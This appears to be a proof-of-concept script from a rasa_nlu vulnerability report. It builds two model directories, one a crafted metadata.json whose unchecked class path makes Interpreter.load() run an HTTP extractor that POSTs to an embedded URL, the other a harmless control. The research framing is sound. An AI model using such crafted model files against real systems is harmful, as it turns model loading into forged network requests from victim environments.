# -*- coding: utf-8 -*-
"""Build two model directories (positive / negative) that differ ONLY in
pipeline[0].class.

Positive: rasa_nlu.extractors.duckling_http_extractor.DucklingHTTPExtractor
          (a component shipped with rasa_nlu). Interpreter.load() resolves
          this string through class_from_module_path() with no allowlist,
          instantiates it, and process() POSTs to the URL embedded in
          metadata.json.
Negative: rasa_nlu.tokenizers.whitespace_tokenizer.WhitespaceTokenizer
          (same metadata shape, never issues network traffic).

No .py/.pickle/plugin files ride along with the model: the only artifact in
each model directory is metadata.json. All capability is drawn from
components already installed in the victim environment.
"""
import hashlib
import json
import os

WORKDIR = os.path.dirname(os.path.abspath(__file__))

# Fields shared by both arms; only "class" differs between the two models.
COMMON_COMPONENT = {
    "name": "ner_duckling_http",
    "url": "http://127.0.0.1:17766",
    "locale": "zh_CN",
}

POSITIVE_CLASS = "rasa_nlu.extractors.duckling_http_extractor.DucklingHTTPExtractor"
NEGATIVE_CLASS = "rasa_nlu.tokenizers.whitespace_tokenizer.WhitespaceTokenizer"

# keep_metadata happy: instance version stamped in the model metadata
MODEL_VERSION = "0.12.2"


def build_metadata(component_class):
    return {
        "language": "zh",
        "rasa_nlu_version": MODEL_VERSION,
        "pipeline": [dict(COMMON_COMPONENT, **{"class": component_class})],
    }


def write_model(dirname, metadata):
    os.makedirs(os.path.join(WORKDIR, dirname), exist_ok=True)
    path = os.path.join(WORKDIR, dirname, "metadata.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(metadata, f, ensure_ascii=False, indent=2)
    return path


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def main():
    pos = write_model("model_pos", build_metadata(POSITIVE_CLASS))
    neg = write_model("model_neg", build_metadata(NEGATIVE_CLASS))

    for path in (pos, neg):
        print("wrote", path)
        print(open(path, encoding="utf-8").read())

    with open(os.path.join(WORKDIR, "SHA256SUMS.txt"), "w") as f:
        for path in (pos, neg):
            rel = os.path.relpath(path, WORKDIR).replace("\\", "/")
            f.write("{}  {}\n".format(sha256(path), rel))
    print("SHA256SUMS.txt written")


if __name__ == "__main__":
    main()
